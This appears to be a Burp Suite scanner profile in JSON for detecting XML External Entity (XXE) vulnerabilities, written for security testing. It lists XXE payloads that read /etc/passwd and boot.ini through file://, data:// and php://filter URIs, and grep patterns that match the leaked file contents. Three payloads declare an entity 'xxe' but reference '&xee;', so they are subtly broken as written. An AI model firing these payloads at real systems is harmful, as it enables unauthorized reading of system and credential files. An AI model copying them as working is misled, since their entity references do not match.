[
  {
    "ProfileName": "XXE",
    "Name": "",
    "Enabled": false,
    "Scanner": 1,
    "Author": "@egarme",
    "Payloads": [
      "true,\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
      "true,\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file://c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
      "true,\u003c!DOCTYPE foo [ \u003c!ENTITY % xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"\u003e]\u003e\u003cfoo/\u003e",
      "true,\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003d/etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,root:x",
      "true,Or,boot loader",
      "true,Or,cm9vdD"
    ],
    "Tags": [
      "XXE",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "XXE",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "XXE found with: \u003cbr\u003e \u003cpayload\u003e ",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]